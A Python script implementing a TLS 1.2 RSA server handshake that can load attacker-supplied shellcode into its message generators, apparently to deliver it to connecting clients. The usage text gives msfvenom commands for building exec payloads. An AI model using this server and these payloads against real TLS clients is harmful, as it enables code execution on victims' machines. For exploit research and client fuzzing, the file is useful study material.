import socket
import os
import struct
import hexdump
import hashlib
import hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

from src.Parsers import *
from src.Generators import *
from src.Constants import *
from src.Utils import *


SHELLCODE = b""

def run_server(host: str = "127.0.0.1", port: int = 8443):
    ctx = Context()
    ctx.IS_SERVER = True
    if SHELLCODE:
        ctx.SHELLCODE = SHELLCODE

    tls_gen = TlsMessageGenerator(ctx)
    tls_parser = TlsParsers(ctx)

    # Basic TCP server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print(f"[+] Listening on {host}:{port}")

        conn, addr = s.accept()
        with conn:
            print(f"[+] Connection from {addr}")

            # 1) Receive ClientHello
            data = conn.recv(8192)
            records, hs = tls_parser.parse_tls_records(data)
            ctx.HANDSHAKE_MESSAGES += hs
            print("[<] Received ClientHello")

            block = b""
            # 2) Send ServerHello (already a full record)
            server_hello = tls_gen.generate_server_hello()
            # Append only handshake payload (strip 5-byte record header)
            ctx.HANDSHAKE_MESSAGES += server_hello[5:]

            # 3) Send Certificate (full record)
            certificate = tls_gen.generate_certificate()
            ctx.HANDSHAKE_MESSAGES += certificate[5:]

            # 4) Send ServerHelloDone (full record)
            server_hello_done = tls_gen.generate_server_hello_done()
            ctx.HANDSHAKE_MESSAGES += server_hello_done[5:]
            
            block += server_hello
            block += certificate
            block += server_hello_done

            conn.send(block)
            print("[>] Sent ServerHello")
            print("[>] Sent Certificate")
            print("[>] Sent ServerHelloDone")

            # 5) Receive ClientKeyExchange (CKE), possibly with CCS + Finished in same recv
            data = conn.recv(8192)
            records, handshake_messages_rx = tls_parser.parse_tls_records(data)
            client_finished_msg = b""
            if handshake_messages_rx:
                # Iterate all handshake messages contained in this flight
                idx = 0
                while idx < len(handshake_messages_rx):
                    hstype = handshake_messages_rx[idx]
                    hlen = int.from_bytes(handshake_messages_rx[idx+1:idx+4], 'big')
                    msg = handshake_messages_rx[idx:idx+4+hlen]
                    body = handshake_messages_rx[idx+4:idx+4+hlen]
                    if hstype == 0x10:  # ClientKeyExchange
                        # RSA: body = 2-byte len + encrypted PMS
                        enc_len = int.from_bytes(body[:2], 'big')
                        enc_pms = body[2:2+enc_len]
                        key_path = os.path.join("certs", "server.key")
                        with open(key_path, 'rb') as kf:
                            priv = serialization.load_pem_private_key(kf.read(), password=None)
                        pre_master_secret = priv.decrypt(enc_pms, padding.PKCS1v15())
                        ctx.PRE_MASTER_SECRET = pre_master_secret
                        keys = expand_keys(pre_master_secret, ctx.CLIENT_RANDOM, ctx.SERVER_RANDOM)
                        ctx.KEYS = keys
                        ctx.MASTER_SECRET = keys['master_secret']
                        print("[<] Received ClientKeyExchange")
                        print("[+] Derived keys")
                        # Append only CKE to transcript now
                        ctx.HANDSHAKE_MESSAGES += msg
                    elif hstype == 0x14:  # Finished (handshake type 20)
                        # Save for appending after verification
                        client_finished_msg += msg
                        print("[<] Received Finished (encrypted)")
                    # else: ignore other handshake types here
                    idx += 4 + hlen

            # If parser buffered encrypted handshake due to missing keys, process it now
            pending = ctx.PENDING_ENCRYPTED_RECORDS
            if pending:
                more_records, more_hs = tls_parser.parse_tls_records(pending)
                # clear buffer
                ctx.PENDING_ENCRYPTED_RECORDS = b''
                # merge CCS records info
                records += more_records
                if more_hs:
                    idx = 0
                    while idx < len(more_hs):
                        t = more_hs[idx]
                        l = int.from_bytes(more_hs[idx+1:idx+4], 'big')
                        msg = more_hs[idx:idx+4+l]
                        if t == 0x14:  # Finished
                            client_finished_msg += msg
                            print("[<] Received Finished (decrypted, buffered)")
                        idx += 4 + l


            # 6) If ChangeCipherSpec and Finished were not in the same recv, read once more
            if (not client_finished_msg) or (not ctx.LAST_FINISHED_VERIFY_DATA):
                more = conn.recv(4096)
                if more:
                    more_records, more_handshake_messages = tls_parser.parse_tls_records(more)
                    # collect CCS indicator
                    records += more_records
                    # capture any decrypted Finished handshake bytes
                    if more_handshake_messages:
                        # There may be only Finished here
                        idx = 0
                        while idx < len(more_handshake_messages):
                            t = more_handshake_messages[idx]
                            l = int.from_bytes(more_handshake_messages[idx+1:idx+4], 'big')
                            msg = more_handshake_messages[idx:idx+4+l]
                            if t == 0x14:
                                client_finished_msg += msg
                                print("[<] Received Finished (decrypted)")
                            idx += 4 + l

            # If ChangeCipherSpec and Finished were in the same read, parser already set ENCRYPT_RECORDS and parsed Finished
            for record in records:
                if record[0] == 0x14:
                    print("[<] Received ChangeCipherSpec")

            #print(f"Handshake messages:\n\n")
            #hexdump.hexdump(ctx.HANDSHAKE_MESSAGES)
    
            # Select hashing algo based on agreed cipher suite
            hash_func = hashlib.sha256 if int.from_bytes(ctx.AGGREED_CIPHER_SUITE, 'big') == ctx.CIPHER_SUITES["TLS_RSA_WITH_AES_128_CBC_SHA256"] else hashlib.sha384
            handshake_hash = hash_func(ctx.HANDSHAKE_MESSAGES).digest()
            expected = pseudo_random_function(ctx.MASTER_SECRET, b"client finished", handshake_hash, 12, hash_func)
            print(f"Comparing received verify with expected")
            print(f"{ctx.LAST_FINISHED_VERIFY_DATA.hex()} == {expected.hex()} : {ctx.LAST_FINISHED_VERIFY_DATA.hex() == expected.hex()}")
            print("-"*60)

            if not hmac.compare_digest(ctx.LAST_FINISHED_VERIFY_DATA, expected):
                print("[-] Finished verify_data mismatch")
                # Send plaintext fatal alert (before our CCS)
                prev_enc = ctx.ENCRYPT_RECORDS
                ctx.ENCRYPT_RECORDS = False
                try:
                    conn.sendall(tls_gen.generate_alert(level=2, description=0x14))  # bad_record_mac
                finally:
                    ctx.ENCRYPT_RECORDS = prev_enc
                return
            print("-"*60)

            # Append client's Finished to transcript AFTER verification
            ctx.HANDSHAKE_MESSAGES += client_finished_msg

            # 8) Send ChangeCipherSpec (plaintext)
            change_cipher_spec = tls_gen.generate_change_cipher_spec()
            conn.sendall(change_cipher_spec)
            print("[>] Sent ChangeCipherSpec")
            # Reset write seq for first encrypted record we send
            ctx.WRITE_SEQ = 0

            # 9) Send Finished (encrypted)
            finished = tls_gen.generate_finished(ctx.PRE_MASTER_SECRET, ctx.HANDSHAKE_MESSAGES, is_client=False)
            conn.sendall(finished)
            print("[>] Sent Server Finished")
            
            # Send application data (simple HTTP response)
            raw_http_response = b"HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nHello from my-tls server!\n"
            conn.sendall(tls_gen.generate_application_data(raw_http_response))
            print("[+] Sent Application Data (HTTP response)")
            print("-"*60)

     
            # Send our close_notify first (encrypted alert)
            alert = tls_gen.generate_alert(level=1, description=0x00)  # warning, close_notify
            conn.sendall(alert)

            conn.recv(4096)
            print("[>] Sent close_notify alert")

            # terminate connection gracefully
            conn.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 server.py <host> <port>")
        print("Usage: python3 server.py <host> <port> <shellcode-location>")
        print("\n\tHint: msfvenom -p linux/x64/exec CMD=id > shellcode.bin")
        print("\tHint: msfvenom -p windows/x64/exec CMD=\"cmd /c whoami & calc.exe\" EXITFUNC=thread > shellcode.bin")
        sys.exit(1)
    elif len(sys.argv) == 4:
        shellcode_path = sys.argv[3]
        shellcode = b""
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
        SHELLCODE = shellcode

    while True:
        run_server(sys.argv[1], int(sys.argv[2]))